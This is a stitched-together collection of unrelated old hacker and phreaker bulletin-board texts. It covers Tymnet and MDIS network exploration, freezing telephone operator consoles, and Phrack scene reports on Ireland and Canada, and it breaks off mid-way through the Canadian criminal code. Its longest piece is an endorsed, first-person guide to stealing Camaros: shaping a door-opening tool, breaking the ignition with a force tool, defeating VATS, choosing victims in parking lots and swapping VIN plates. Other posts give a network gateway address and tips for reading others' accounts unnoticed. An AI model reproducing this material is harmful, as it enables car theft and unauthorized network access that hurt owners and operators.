really do anything cool with SERVORD, but hey..
 
 Sorry if you people knew all of this already.  I guess I'll keep posting about
it as I learn more.
 
 Sheesh.  Lame post.

I believe ANI was correct about the acronym for ISIS.
Internally Switched Interface System
I think it is the go between from the engine to the node code.  Kind of like
how assembly is the go between my apple and basic.
 
ELF - Engine Load Facility. This is a program that transfers and loads code
into a TYMNET Engine node.
 
ISIS has slots, in each slot a program (node code) can run. This node code
is different for different tasks.
 
I should clarify the above, only one 'application' ie: gateway, tymcom,
whatever, can run on isis, and usually is found on slot 0. But other programs
can be run on other slots. Programs that allow you to log into the slot and do
things. like DDT - Dynamic Debugging Tool.
 
 
All this and more will be explained in my upcoming (hopefully) file on Tymnet

The system used for setting up the DECLOD acct was TYMVALIDATE which isn't
exactly the same as NETVAL but close.
 
Be careful with ONTYME II, since it automatically updates ALL files you read.
So if you read some files in that persons' personal directory, they can see
that either someone has their acct/pass or someone is using IMITATE and reading
their stuff. Me and Skinny Puppy are working on a way to defeat this....

International Tymnet - how many of you have seen tymnet claiming that it serves
over 65 countries, but don't really belive it? well, they do, sort of.
There is a tymnet-europe called Mcdonnell Douglas Information Systems (MDIS).
While I don't have any dialups for it, I have X.121 addresses in France and
BeNeLuxKG. once you get there, you can type HELP and glean alot of what is
going on. The interesting thing is that a lot of things that say ACCESS NOT
PERMITTED from regular tymnet are actually european addresses and can be used
on MDIS. for instance, ROMA (Italian for ROME), ESAIRS, and EURONET (which is a
host selector for american public timesharing systems). While there doesn't
seem to be a lot of european hosts, I am sure that if everyone on here pulled
up all their old tymnet-hack sheets where they had things listed as ANP (My
abbreviated for ACCESS NOT PERMITTED) and tried a few we could find something
new. Right now, I will only give out my French MDIS gateway - It is
208092020029. Figure out how to get there yourself. If you DO find anything
interesting, leave me mail, and we can trade. I already have some internal MDIS
systems there, if I can just figure out how to use them.
 
Coming Soon to a Board not so near to you: NISNET (tymnet-japan) and the
Carribean tymnets. Until then, ASSIMILATE

To answer ANIF's question, I have been doing some TSPS/TOPS engineering lately
for a variety of purposes, one of which is a bit far fetched but has
possibilities. I am trying to  find a way to possibly freeze an operator
console (the method I am trying is actually simpler than it sounds). It
involves getting the op to connect to a short circuite test code, either by ACS
(key) or by OGT (outgoing trunk) outpulsing sequence. There area a few flaws in
this though, the main one being the more than likely possibility of the Op
simply releasing the console position (even though the short circuit, when
dialed, cannot be hang up on, the  caller must wait for it to time out (about
three minutes or so).If this was the  case, then the result could be the
Operator having an inaccessible outgoing line for a short period of time, which
wouldn't affect much with the actuall console..The things I tried recently with
this didn't result in much, but if I take into account TOPS/TSPS RTA (Remote
Trunking Arrangements) setups (where a caller from one area code, with a 0+ or
0- call, may be connected to an operator in a site in a different NPA. Test
codes are different, even in exchanges, so an operator site in a diffeerent NPA
wouldn't be affected the same with a different code.
 
The overall purpose to this would be to create a certain condition with the
operator network that could be used to gain information when investigated, say
by someone from Mtce. engineering or theTOPS/TSPS SCC or equivalents. There are
other ways to start an engineer of course, but this is just something that's
concrete (meaning you could get people to fish around for info a bit easier
than coming in for a random request.
 
This is getting a bit long. I'lll post more later about Operator engineering,
something more immediately practical next time. The board looks promising.

PURPOSE:  To describe step-by-step, with specificity, exactly how
the average person might accomplish with skill and alacrity, the
theft of a motor vehicle, particularly 1982-1993 Chevrolet Camaros,
Pontiac Firebirds and similar beasts.

MOTIVE:  While I am a telecommunications enthusiast, I am also a
basically honest, law-abiding working man. In 1989 an individual
driving a borrowed automobile struck my only means of transportation,
a 1986 Chevrolet Camaro, totalling it. My vehicle was parked and
unoccupied at the time. In an amazing feat of legal maneuvering,
and after protracted judicial proceedings, all parties involved
managed to escape liability and I was left without a car or
reimbursement. The insurance companies are lying, cheating scum.
As a result, I took matters into my own hands and stole a
replacement car. I came to the conclusion that the justice system
in this country exists only to protect the strong from the weak,
the haves from the have-nots and the rich from the not rich. It
has nothing to do with rectifying wrongs. It is therefore incumbent
upon all aggrieved parties to seek personal satisfaction when the
American legal system fails to provide it. My motive is thus
twofold:

1.  To see the evil insurance companies screwed some more by
    sharing my knowledge of car-thieving techniques with those
    who might apply them.

2.  To assist the little man in obtaining justice when he/she may
    by confronted with a situation similar to mine.


BACKGROUND:  Before I stole my car, I conducted extensive research
             and talked to a number of individuals in the automotive
             repossession field, law-enforcement, and several auto
             mechanics. I assure the reader that everything
             contained in this file is true to the best of my
             knowledge and that I HAVE ACTUALLY DONE WHAT I AM
             WRITING ABOUT. I am not writing hypothetically; I
             speak from experience. I urge the reader, if he is
             serious about stealing a vehicle, to verify my
             research and find out much of this information for
             himself. Auto shops at local high schools/community
             colleges are excellent places to experiment and
             learn, and auto repossession specialists are invaluable
             sources of information.


------

  So, you've decided to steal a car. How nice. In this article I
will be covering in detail exactly how I stole a 1988 Chevrolet
Camaro to replace the 1986 of mine that was destroyed by an
irresponsible driver. The techniques described herein will work on
1982 thru 1993 Chevy Camaros/Z28s/IROCs/Berlinettas and probably
the same years Pontiac Firebirds and Trans Ams. With regard to
the Pontiacs I cannot say for certain because I only experimented
on Camaro variety cars since that is what I was after. The Pontiacs
are very similar, however, and I believe this information to be
applicable to them.

  There are basically only two stages to obtaining possession of a
vehicle. First, one must gain actual physical access to the inside
of the car and second, one must disable the steering-lock mechanism
and activate the ignition. Once these two things have been
accomplished, the vehicle is yours, subject to the infuriated
efforts of the owner to regain it. It should be noted, of course,
that there may be complications associated with either of these
steps, such as alarm systems or the factory anti-theft mechanisms.
I will deal with both of these in turn.

  First, gaining entrance to the vehicle. This will require one
tool: a 24-inch aluminum "shop" ruler. I tried several and settled
on the Pickett brand ACF-24, available in most art/blueprint supply
stores. It consists of a 1.25x24x1/16 inch piece of aluminum. For
maximum efficiency, it should have two slight bends to it. First,
at 14 inches, bend it subtly to about 15 degrees. Then, at 19
inches on the ruler, bend it back so that the two sections are
parallel. Like this:
                                                        N
                  _________________                   W + E
                                   \_______             S

  Of course, the angle in this diagram is far too steep. Both angles
should only be about 15 degrees. Hopefully, you get the idea. If
not, you probably shouldn't be thinking about stealing a car. In
any case, if you have succeeded in fashioning this, you are now
armed with the only tool necessary to gain keyless entry into your
soon-to-be new Camaro. The application of this tool is simple.
Walk up to a Chevrolet Camaro of a year described above, position
yourself at either door. FIRST: Check to see if the door is
unlocked. You'd be surprised. If it isn't, you will need to insert
the tool straight down, in between the rubber weather-stripping and
the glass, approximately 4-5 inches from the back of the door,
directly in line with the door-lock. Insert the tool such that the
small section (see above diagram) is thrust down into the door (did
I mention that stealing a car is very sexual? Never mind...). The
small section of the tool should be bent TOWARDS you as you stand
at the car. In the above diagram, north is towards the car, west is
straight up in the air, east is straight down towards the inside of
the door, and south is towards you as you stand at the car. Got the
picture? If not, get a friend to explain it to you.

  The tool should go in about 16 inches until it catches the lock
mechanism. If it goes in further than about 17 inches, withdraw and
try again. Drive straight down, don't force, try moving your
position an inch to the right or left. Eventually you will feel
the lock mechanism. It will be rigid but a little spongy (epitome
of GM engineering). Press down hard on the tool and let up. Try
the door handle. Does it open? It probably will. If not, drive a
little harder and keep trying the door. It will give eventually.

WHY THIS WORKS:  Well, this works for two reasons. First of all,
General Motors is run by a bunch of cheap bastards and their
cars are designed by engineers who couldn't find their asses with
both hands. Basically, it's a shitty lock mechanism. It was
designed shitty and the clods who sell us the piece-of-shit cars
couldn't care less if they get stolen so they've never bothered to
redesign the damn thing.

  In order to understand exactly why it works, the curious reader
would be well advised to go to his local library and look in a
Clymer or Chilton automotive repair manual for 1986 (or thereabouts)
Camaro.  In Chapter 12 of the Chilton, under "Body" (page
290 of mine) there is a magnificently concise exploded diagram of
"Outside door lock assembly" which contains all the relevant
information. The lock cylinder itself is connected to some linkage
which activates the locking/unlocking mechanism. After a few
months of normal use, this linkage develops some "slop" in it due
to slight wear of the locking cylinder attachment. By pressing
down on the linkage down inside the door, you are activating the
(un)locking mechanism directly and there is enough play in the
locking cylinder to allow it to give. Take a look at the diagram
and you'll understand completely.

  Once I understood the locking mechanism, the deficiencies
therein, and formulated an approach to overcoming it, I
practiced on a friend's Camaro about a hundred times. If done
properly and carefully, this will in no way harm any part of
the car or locking mechanism. Try it on the driver's side
first; this is usually the easiest because it has the most wear
in the linkage. Then graduate to the passenger side door. Then
try it out about a hundred times, then with your eyes closed,
then while drunk, then with one hand tied behind your back. In
a day or two you'll be able to get into a Camaro in less than
ten seconds.

  A note about alarms: some clever individuals, in an effort to
keep their prized vehicles from being stolen by the likes of you,
have equipped them with a motion sensor or other devious device
which tends to emit a shrill series of tones when aggravated. I
suggest that before trying to open someone else's car, you first
give it a good rocking back and forth in order to set off any
alarm which might be present. Since it is not illegal (though it
may be physically dangerous) to rock someone's car, it's always
best to try this before actually breaking in. If the alarm
screams, go on to some other victim. Personally, I have
encountered very few alarms; the "it won't happen to me" attitude
is still prevalent.

  Once you've gained physical entry into the vehicle, you are
now ready for Step Two, ignition lock bypass. Unfortunately, this
is a difficult step. I did a tremendous amount of research to
determine the best way to deal with this problem and have
developed an approach. It is by no means the only way to breach
the ignition locking mechanism, but in my opinion it is the
best. In developing this method I was most interested in several
goals. First of all, I wanted an elegant solution; that is,
something simple. Minimum tools and work required, and something
that worked ALL THE TIME, not 50%. Second, I wanted an approach
that could be accomplished quickly (for obvious reasons) and with
minimum damage to the vehicle. Ideally, I wanted an attack which
would not even be immediately obvious to someone (such as a cop)
glancing in my car at a stoplight. Spending 30 minutes tearing
apart the steering column might allow you to get the car started,
but it won't meet the above criteria: speed, elegance, reliability,
invisibility.

  The problem is that to do this requires a special tool and to
get this tool one must either send away for it or have access to
a machine shop to fabricate one. Neither of these is quick and
easy, but the preparation is well worth it. Here's the basic
idea. The General Motors vehicle uses an ignition locking
mechanism called a "sidebar." This is basically one nasty piece
of hardened fucking steel which blocks the lock cylinder from
rotating when a properly-fitting key is not in place. It makes
it impossible to simply "shear off the pins" by brute-force
turning with a screwdriver or similar device. The solution is to
use a tool capable of cracking the lock cylinder housing in which
the sidebar sits. The cylinder housing itself is cast aluminum,
which is considerably weaker than the sidebar itself, so when the
proper force is applied it will be the housing which gives, not
the sidebar. But no matter.

  First, get access to a Camaro, or for this exercise, just about
any GM automobile since 1978 (the year they got the bright idea
to put a locking screw in to keep people from just ripping the
whole ignition lockset right out -- but that's a whole different
story...). My favorite place to experiment on cars without being
observed (and in fact legally) is to go to a local self-serve
auto-wrecking "You Pull It" yard. They have these in many cities
around the fruited plains; you pay a buck or two to get in and then
go pluck parts from rotting American classics. If you don't drag
any parts out, you can basically tear apart all the cars you want
for a buck. If you don't have a You-Pluck-It nearby or are
philosophically opposed to vehicular cannibalism, then use the
method previously described to break into someone's Camaro for this.

  Once you have access to a GM (preferably a Camaro), get a
screwdriver out and pry the outer ring off of the ignition set.
The ring I'm talking about is the thing with the two tabs on it
for your fingers to turn when you rotate the ignition to start
the car. Just pry that sucker off of there -- it comes off very
easily as it is affixed by two small gripping tabs. I can usually
remove it by hand, but it's easiest to simply pry gently with a
screwdriver. After you have pried that off of the ignition set,
take a look. You'll see the ignition cylinder (with the keyway),
the outer housing, and the actual ignition activation mechanism,
which has two slots in it (where the outer ring fit into before
you pried it off). This ignition linkage, with the two tabs, is
what turns when a fitting key is inserted into the keyway and then
turned. Note that in a GM ignition set, a fitting key serves only
to withdraw the sidebar to allow the outer ignition mechanism to
turn.

  The problem is to overcome the sidebar which prevents the
ignition from turning. Fortunately, there is a tool for this very
purpose. It is manufactured by Briggs and Stratton (yes, the lawn
mower engine people) who happen to also make the locksets for GM.
They make the locks. They make the tool to break the locks. You
figure it out. Anyway, this neat little device is called a "GM
Force Tool". I got mine from LDM Enterprises in Van Nuys, California
(where else?) and it ran me about $90. Their fone number is
800-451-5950 and you should probably tell them that you're in the
automotive repossession business if you go to order one of these.
If they won't sell you one (because someone at GM read this
article and hopped up and down) then simply go down to a local
repo man and pay him an extra $25 to order one for you. Most of
those guys are pretty sleazy and will do just about anything for
a buck. If you have access to a machine shop and are reasonably
competent, go ahead and make one.

  I will attempt a description. Don't feel stupid if you don't
get this; it's difficult to describe it in text. Drop me E-mail
and I'll send you a .GIF of the fucking thing. Anyway, it looks
basically like a socket with very thin walls and two small tabs
which fit into where the thumb-ring-thing used to go. You tap it
onto the ignition set, into the two slots and the outside walls
of the tool fit very snugly around the outside of the locking
mechanism to keep it from splitting apart as you turn it. On the
other end of the tool is a 1/2 inch square hole for a ratchet.
Got the idea? Tap it onto the ignition, attach a healthy sized
ratchet and turn slowly but forcefully. After about 30 degrees of
turn the sidebar will crack the ignition lock housing and the
whole mechanism will freely turn. If you don't understand this,
take a look at a GM ignition (sans outer ring) and the facts will
become readily apparent. If you have access to a machine shop, it
is a simple matter to make one of these tools. Go to your local
GM dealer and buy a whole ignition set, snap the outer ring off of
there and take your measurements. Remember that the inner wall of
the force tool must fit snugly around the lockset in order to keep
it from splitting apart. That is why a device with simply two tabs
which fit into the ignition linkage will not work (I tried it --
the metal is too soft and tears apart).

  Seem like too much work? Well, of course it is a bit of work,
but preparation is the key! My father always stressed that the
most important part of doing a job is having the right tools. The
tools in this case are KNOWLEDGE of how all these goofy parts fit
together and operate, a properly constructed force tool, and the
patience to apply these two components to bring about the desired
result. With some practice I was able to circumvent a Camaro
ignition in just under 30 seconds. It does very little actual
damage to the vehicle ($11.00 for a new ignition set) and in fact
the thumb-ring-thing can be jammed back on and a key inserted and
it will appear that everything is proper (in case you're pulled
over by the local constable).


V.A.T.S.
--------

  Because of the horrendous problems with car theft, particularly of
Camaros, GM came up with a neat system boldly dubbed the "Vehicle
Anti Theft System". Needless to say, as with most security devices,
VATS accomplished little more than being a nuisance to vehicle owners
and a minor inconvenience to car thieves. Here's how to defeat it.

  First, basic theory of operation. The ignition of a VATS equipped
vehicle (most 1988 and newer GMs, particularly the Camaros/Firebirds)
is the same as the normal GM ignition except that it has an
electronic sensor built in which requires activation by a resistor
pack built in to the owner's key. There are fifteen possible resistor
types, so each different VATS key that you have gives you a 6.7%
chance of being capable of activating the ignition. The catch is that
if you feed it the wrong one it will kill the ignition for 4 minutes.
Thus, if you had a complete set of fifteen VATS keys, it would take
you a maximum of one hour to run through them all. This is GM's
idea of security: annoy the thief.

  If you plan to tackle a VATS-equipped car, get a full set of the
fifteen VATS keys. They're a few bucks each and you can get them
from a locksmith or LDM. Obtain access to your target car in an
area and in such circumstances as will allow you to work for an
hour relatively undisturbed. In practice, this is not very difficult
(more on that later). Once you have access to the vehicle and are
satisfied that you can work unobserved, break the ignition lock
using your force-tool as described above. Insert your first VATS
key blank and attempt to start the vehicle. If it will not activate
the ignition, remove the key, wait four minutes and try the next
one. Eventually you'll hit it. (Median hit time, of course: 30
minutes). Drive away.


Scouting a Victim
-----------------

  An essential element of stealing a car without getting caught
is picking out the right one. Again, preparation is the key. Once
you've mastered the necessary techniques, start looking around for
a good place to pick up a vehicle. The car thieves that I spoke
with told me that their preferred places are mall parking lots at
night: there is a lot of activity so you probably won't be noticed
lurking around waiting for a good prospect to show up. People
usually go into the mall for several hours to buy crap, so you have
time to work. Wait until no one is looking and pounce. Once you are
inside the vehicle (which, with practice, may be accomplished in
15 seconds) you are home free. No one is going to pay any attention
to you screwing around inside the vehicle and you'll be long gone
by the time the owner finishes charging a new Salad Shooter on his
American Express. Another good place is airport parking lots. While
they are often sporadically patrolled, it is in practice a simple
matter to drive around until you spy the right vehicle, then pack
all your necessary tools into a suitcase and walk from the terminal
to the lot like a returning airline passenger. That's how I did it.
The car was not reported stolen for over two weeks (it was in the
long-term lot), giving me plenty of breathing room.

  There are numerous other places. Start noting the places that
you leave your car: supermarket, movie theater, in front of your
house, at work, in a parking garage, etc. Start noticing patterns.
That 1988 IROC you see parked in the same place for five hours
every Tuesday. When you actually commit the deed, BE PREPARED. Do
a dry run. Be calm, work quickly but carefully. Act like you
belong where you are -- don't lurk around nervously. Walk right
up to the car and steal it. If confronted by someone, try to talk
your way out of it. Don't get violent: it's just a thing. A car
is not worth hurting someone over. Don't worry about getting
caught: most cities can't cope with the crime epidemic and do not
bother to do much about auto theft.


What Do I Do With It?
---------------------

  That's up to you. Take it for a joy ride. If you boosted it from
an airport lot you can probably safely cruise around in it for a
week or two. Go pick up bimbos and drive them to Las Vegas. Or
sell the thing to a chop shop (you're on your own finding them; I
have no experience with them). Tear it apart yourself and sell the
parts. Drive it into the lobby of an insurance company building.
Or go buy a Camaro of the same year and model that has been
totalled out and switch the VIN plates once you have clear title.
That's not a particularly difficult affair, although some skill is
required to remove the VIN tags and install them in your new car.
Have fun! Stay out of trouble. If you have any questions, E-mail
me. Above all, keep in mind that two things are essential to steal
a car without getting caught: PRACTICE and PREPARATION. Good luck!

 Well, here it is, the list from hell. Sure beats the old lists of 100
or so three letter acronyms. The whole reason for this list is so that
you  can  crack almost ANY bell document.  This list came from  a  few
lists  (one in Phrack a while back)  and a few other Telephony  lists
here and there. Though it must be noted (and i want to take credit for
it)  that  well over half of the acronyms and abbreviations were typed
in by me,  inputed into my database (of course I am not about to give
out my database).
    It is always a good idea to start a database, one will learn a lot
faster.   It  is  doing  things scientific like,  and for  someone  as
compulsive as I,  solving the puzzle of the telephone company was easy
as pie. I must say that all the hackers I have meet, and talked to are
all compulsive as hell <G>.  I think it is just what it comes down to,
who is willing to learn.   Any ways here is two fields in my database,
one small part,  but worth it.   Though i do not think it will be able
to  help most of you out,  just gets into too much,  and understanding
which  acronym goes where,  and understanding what goes where is hard.
Well good luck!

                              International Scenes

There was once a time when hackers were basically isolated.  It was
almost unheard of to run into hackers from countries other than the
United States.  Then in the mid 1980's thanks largely to the
existence of chat systems accessible through X.25 networks like
Altger, tchh and QSD, hackers world-wide began to run into each other.
They began to talk, trade information, and learn from each other.
Separate and diverse subcultures began to merge into one collective
scene and has brought us the hacking subculture we know today.  A
subculture that knows no borders, one whose denizens share the common goal
of liberating information from its corporate shackles.

With the incredible proliferation of the Internet around the globe, this
group is growing by leaps and bounds.  With this in mind, we want to help
further unite the communities in various countries by shedding light
onto the hacking scenes that exist there.  We have been requesting files
from people to describe the hacking scene in their country, but
unfortunately, more people volunteered than followed through (you know
who you are.)  By next issue we will have more, I'm sure, but for now,
we want to introduce you all to the scenes in Ireland and Canada.

                           HACKING IN IRELAND
                                   BY
                                HAWKWIND

 Greetings from the Emerald Isle!  My name is Hawkwind, and I'm an
Irish hacker *evil cackle*.  So, what's the hacking scene like in this
small green island called Ireland, perched on the edge of the Atlantic
Ocean?  -an island which claims to have one of the most sophisticated
digital phone networks in Europe, home of Eirpac (the Irish equivalent to
Sprintnet/Telenet) and lots of other weird and wonderful things like
that.

 Well, the hacking scene, like the country itself, is small
-there are no elite in Ireland. -or if there are they are so elite that
nobody has heard of them.  So if you're only into elite stuff, then
don't bother reading on, skip onto the next country.

 Also, sadly at the moment, there seems to be little interest in
hacking in Ireland  -I can count the number of Irish hackers I know on
the fingers of one hand.  Maybe I'm just hanging out in the wrong places,
or perhaps its the Iron Hand of Ireland's own Little Brother, friend and
follower of the U.S's Big Brother, enforcing his evil ways of censorship
and the like upon us all, denying us the right to free information.
Nationwide censorship of Usenet hurts like dry ice, but restricting ftp
and telnet out of the country to the privileged few, is the fatal
crunch.  Now, I ask you, with grief like this, is it any wonder so few
Irish have made it into the Computer Underground  -to those that have
beaten the odds, I wish them well.

 OK, so what do Irish hackers like to hack?  Like many hackers we
just have the curiosity and desire to explore any system or network we
come across  -the everlasting search for that spine-tingling adrenaline
rush when you've beaten the system and got somewhere where perhaps no
commoner has gone before  -don't ever ask us to choose between getting
well drunk, having sex, or hacking  --it would be a rough choice.

 Let me start by telling you of what I find an interesting moment
in Irish hacking history. -to you it may just seem like no big deal, but
we kinda like it.
 There is a type manufacturing company in Dublin, Ireland and
they like to make tyres--in order not to ruin any reputations we won't
mention any names--just another tyre company.  Now this company likes
nice modern systems--big colorful display panels with lots of flashing
lights, to keep their managers happy and amused for hours.  A happy
company is lots of happy striving workers and so, a big flashy sign
which displayed the number of tyres being produced, and dutifully
counted upwards every time one come off the assembly line, was
constructed.  So they had a big sign inside the plant so the workers
could see how hard they were working, and big bonuses and lots of
presents were promised if they got past a certain number in a day.
There was also a large juicy sign outside the plant showing this number
so that the general public could be suitably impressed with the busy-bee
workers and the number of tyres being produced.

 And all these signs and computers controlling them were
connected to such mysteries as a network with a couple of black boxes
which management proudly called modems  -enter stage left, Irish
hackers, *deep bow and evil wave*

 So you can imagine, one warm sunny summer's evening, when there
was really nothing better to do in Dublin, strange things started to
happen at the tyre factory.  Yes, strange things indeed.  Suddenly the
workers got very lazy and started slowing down their production,
becoming slower and slower and slower.  The numbers stopped counting up
on the glowing sign.  Then the digits oddly started counting backwards.
Down they went, getting faster and faster  -people began to picture
enraged workers destroying tyres in a crazed frenzy.  Soon our sign
showed that there were no tyres left and it began to dive into negative
numbers of tyres.  The passers-by scratched their heads in astonishment.

 Ah, but enough fun  -this really was a very good tyre company
with very hard-working workers.  They deserve lots of bonuses  -heck,
didn't someone say this was the most productive factory in Europe?  Well
it was that day anyway! *evil cackle*  So the signs stopped counting
backwards, and suddenly began to race forwards like there was no
tomorrow.  The workers were scurrying back and forth at lightening speed
-one hundred, two hundred..a thousand...ten thousand...what, a hundred
thousand!  Soon our good workers had produced more tyres in the space of
20 minutes, than visitors Disneyland had in 25 years...

 Ah yes, these are the things that Irish hackers like to do -we
still wonder if the management gave all those good workers their
bonuses??

 So really, we like to investigate or hack anything that we might
stumble across  -anything from the local University library computer to
tyre companies to networks in lands far away.  One of the things we
really like doing is just exploring, hopping from one network to the
next, using computers in such awed places as the U.S., Canada or Mexico,
this is probably because for us, even to reach such computers and
networks is an achievement, that our Little Brother would deny us had he
his evil ways.  We think that the Internet is one of the greatest
creations in a long time, and we would never want to do any malicious
damage on such a free association  -if only our Little Brother would let
us associate freely with it, instead of making life just that little bit
more difficult.  We find Sprintnet and other connected goodies
interesting prowling grounds, although we are the first to admit that we
still have very much to learn here.  To explore these systems is very
interesting for us, because they are so far away and in such interesting
lands that we may never see ourselves  -what to you might be the old U.S.,
to explore the nets there gives us a sense of excitement and a variety
of systems that cannot be found on such a small island as our own
Ireland.

    And of course, there is the never-ending quest for U.S. outdials
in the hope that one day we might actually reach some of the fabled U.S.
h/p boards and actually meet a real Fed or two.  *snicker*  Turning from
the strictly hacking scene for the moment there are some Irish people
interested in the phones and other phun things  -a while back two
college guys were busted for cracking an eleven digit code on some new
phone system chip or something, which had given them unlimited dialling
access and other phun privileges.  -then there was the magic toll free
number which for a month or two gave the Irish population unlimited
access to the outside world (a big thank-you goes to whoever worked that
one out. *grin*)  I'm told from reliable sources that we have a pretty
sophisticated phone system, a matter we soon hope to be investigating,
but this does not seem to have stopped phreakers from trying, and if we
manage to work anything out, we'll, as our 'Telecom Eireann' so aptly
put it 'Keep in touch across the world'.

 Sadly, we are plagued by outrageous phone charges, even for
local calls and hence many Irish boards have failed to blossom  -of
those that do, the sysops seem to be little interested in h/p talk and I
know of no dedicated h/p Irish board.

 There also used to be a type of Underground meeting that occurred
every dark rainy Sunday afternoon, down in the Ormond, a hotel in Dublin
city centre.  It passed unheeded under the guise of a computer club, but
the bloke who ran it was a renowned con-man, and dealer of everything
and anything from car radios to Rolex watches  -in any event the club
must have been one of the biggest WareZ swapping centres, including all
the latest videos from the U.S. which would not be released in the
cinemas(movies) here until six months later.  Generally people
interested in the same computer type things just got together to chat
and swap the latest news, disks and videos  -an interesting place with
interesting folks, which sadly no longer seems to happen.  Perhaps
someone will revive something similar in the near future.

 Well, I'll end the tale there for the moment.  Hopefully you've
gotten a little flavor of our little Underground, watched over by our
Little Brother, in our little country called Ireland.  I'm not sure how
I ended up writing this article, but since nobody else stepped forward, I
thought Ireland should at least get some kind of mention, if nothing
else  -so you can /dev/null any flames.

 Before I sign off, I'd just like to thank Phrack not only for
giving me the chance to tell my tale, but for supplying us with a great
publication and guide to the Underground.  Finally, if you are an Irish
hacker/phreaker, then get in touch now!!!  -I really want to be able to say
that I can count the number of Irish hackers I know on two hands, and not
just one, before the end of the decade!  Also, I am always interested in
talking to anyone interested in the hack/phreak world so get in touch if
you want to chat  -just remember, we are no elite!
(I don't suppose anyone out there, knows anything about the Irish phone
system? *shrugs*)

Ok, I can be reached at the following, for the next little while:
(Yes, I do have Irish a/c's but not for thine eyes...)

 al575@yfn.ysu.edu
 hawkwind@m-net.ann-arbor.mi.us
 hawkwin@santafe.edu  (note: no 'd' at end userid)


I'm also sometimes on IRC, and may hopefully be on phantom soon.
Well, as we say in Ireland, good luck and may the road rise up before
you.

Slan Leat,
Hawkwind.

                           Canada
              All is Quiet on the Northern Front

                Written and compiled by Synapse

Welcome to the barren wastes or rather the undeveloped wastes if
you will. Welcome to Canada. A realm seldom traveled and less
often explored. Canada, or .ca if you will, is virgin country in
the net. There are places that have been sitting idle for years
on our nets that still have default accounts in use. There is an
unmeasurable amount of data out there waiting to be tapped. The
possibilities in this are endless, Canada is untouched for the
most part, and as developed networks go, I feel that Canada is as
close to The 'Undiscovered country' as you can get.

Most likely if you are reading this article you will be of a
nationality other than Canadian. If so, perhaps this will be an
educational experience for you. To explain our nets and our scene
here in the far far north, I must first explain our nation and
its greatest difficulty, it has NO identity, therefore it tends
to mirror those it is enamored with.  Hence our scene resembles
an amalgamation of whatever seems popular in the nets at a given
time. Most often it attempts somewhat miserably to emulate the
scene south of our border, the great U S of A. And in short it
fails miserably.

This is not to say that Canada does not have a scene of its own
nor is it attempting to take away from those scenes that have
developed fully on their own within .ca. It is simply bringing to
light a problem that plagues our scene and dilutes it for those
who are serious about the computer underground, and whatever
ideals it may contain.

If you travel the nets in Canada you will find that dissent and
"ElYtEeGoStRoKInG" are staple with both the Hacking and Warez
scenes all throughout the nine provinces and 2 territories. As I
am sure you know this is not a problem unique to .ca. However in
a scene as minute and spread painfully thin as ours, arrogance
and mis-communication can be fatal in the way of cooperation
gaps. This has proved the case many times in the recent past, and
I am sure it will in the near future as well.

Canada seems to a have a communication barrier that separates
east from west. There is simply close to no communications
between the two. It is as if we are in separate hemispheres and
lost to the technology of fibber optics and damned to smoke
signals and drum beating. I have to wonder sometimes if both
sides are so involved in their own local power struggles, that
the rest of the world has melted away including their country men
on either side.

Alas it is time to dive into this the this of the article. To
detail the complete underground in Canada would be impossible for
me to do, to even give a non-biased view would be impossible. So
if you feel that this is simply an overextended opinion, thank
IBM for the PgDn key and spare yourself some opinionated text.

                    The Almost LODs of .ca

Just like the U.S., Canada is proliferated with umpteen amounts
of upstart groups who after reading some trashy second rate book
on LOD or Kevin Mitnick, have decided that they have found what
it is to be elyte. Most often these will be the prominent voices
on underground boards spitting flame and stroking immeasurably
unhealthy egos, and boasting how proficient they are with toneloc
and Killer Cracker. However as with most boasts put forth by
fourteen year olds, nothing comes of it.

However if you can manage passage through the quagmire of shit
that serves as the .ca scene, then you will most likely encounter
some of .ca's more serious minded types who while retaining
talent and a penchant for learning, do not sport an ego of
astronomical proportions, and wit that would bring condescension
from an ant. The following is a short list of several of .ca's
more prominent if not more talented groups.

                   RaBID The Virus People

If the Virus world is your environment, then most likely you
have stumbled across the work of RaBID, hopefully not on the
receiving end.. Rabid is based out of 416 or rather Toronto
Canada, at it's prime Rabid was running a mail net that spanned
Canada and were releasing enough material to employ the boys at
McAfee. Things have changed. While Rabid had at one point been a
productive group (if you can call a virus group productive) time
seems to have worn their edge, in fact Rabid as a group have
failed to release anything of value in a great long time. Perhaps
this will change. If nothing else Rabid did bring a much needed
ego boost to the Canadian scene, in doing so they opened the door
for other such groups to be seen on the international level with
out being laughed out of the nets. For this if nothing else they
deserve recognition. There is a great deal more to be said  about
Rabid, however as I said all the information given here will be
cursory, if you require an information at all in the future on
Rabid or any of the groups mentioned below I will leave an e-mail
address below where you can write me, I will help you if I can.

                 FOG out of 403 Calgary, Alberta

No scene is complete without talented juveniles given to temper
tantrums virus spreading and general malicious behavior..Enter
FOG. FOG stands for the Fist Of God, it is for the most part a
group of individuals who go through unnatural amounts of effort
to get under the skin of others. Yet beyond juvenile behavior
that tends to underscore most endeavors they undertake. FOG does
for the most part work very diligently for a united .ca scene.
They have in the past run a nation wide net using encrypted mail
procedures so that dialogue could be opened between the east and
western scenes. This event was stopped when the Hubs house was
raided by the Royal Canadian Mounted Police for suspected telco
abuse, they were no charges laid however yet the organizers felt
that the information passing through the net was much too
valuable to be compromised by a bust. The net was killed.

After the net disappeared several members of FoG began writing
bbs software to be spread across the country to make networking
easier or rather standardized. The bbs also includes encryption
options for the mail, and will soon be HAM radio as well as
cellular modem capable. This program is available to any who wish
to take it, as I said earlier, just mail me.

                   NuKE Making Art out of Arrogance

NuKE hails from 516 Montreal, Canada.  It as far as I can see
primarily now a virus group. Producing and modifying strains, for
the most part NuKE has been the most active underground .ca group
that has seen movement on an international level, with this past
year.

It's membership has changed quite severely since I last had
contact with them. Therefore I fear that to publish anything else
on them would be inaccurate and therefore an injustice. However
if you are interested in pursuing this topic........Mail me.


As you can see these are cursory overviews of Canada's groups it
is of course largely incomplete, I provided it only to serve as a
guide for the feeling of Canada's groups. There are of course
many worth mentioning that I failed to show, and moreover there
is a great deal more to  the groups that I did mention. To those
who are in the above groups are unhappy with the opinion put
forth please by all means FUCKOFF. I e-mailed all of you, and in
your infallible wisdom you failed to reply. So suffer with it :>

                     .ca and the law

While Canada has been for the most part largely un-abused by the
'Computer Criminal'. It's laws are none the less fairly advanced.
Our legislators to their credit have kept a close eye on our
neighbors in the south, and have introduced laws accordingly.

The following is the Canadian criminal code as pertaining to
Computer Crime.

342.1
    (1) Every one who, fraudulently and without color of right,
        (a) obtains, directly or indirectly, any computer service,
        (b) by means of an electro-magnetic, acoustic, mechanical
             or other device, intercepts or causes to be intercepted,
            directly or indirectly, any function of a computer system, or,
        (c) uses or causes to be used, directly or indirectly, a
            computer system with intent to commit an offense under
